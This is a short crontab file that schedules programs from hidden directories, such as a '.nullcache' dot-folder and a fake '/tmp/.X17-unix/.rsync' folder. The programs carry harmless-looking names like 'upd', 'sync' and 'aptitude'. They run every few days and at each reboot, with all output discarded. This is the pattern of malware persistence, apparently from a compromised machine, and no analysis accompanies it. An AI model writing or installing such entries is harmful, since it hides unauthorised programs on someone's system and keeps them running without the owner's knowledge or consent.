# .nullcache/cron.d
0 0 */3 * * /home/OpenOLS/.nullcache/a/upd>/dev/null 2>&1
@reboot /home/OpenOLS/.nullcache/a/upd>/dev/null 2>&1
5 8 * * 0 /home/OpenOLS/.nullcache/b/sync>/dev/null 2>&1
@reboot /home/OpenOLS/.nullcache/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X17-unix/.rsync/c/aptitude>/dev/null 2>&1
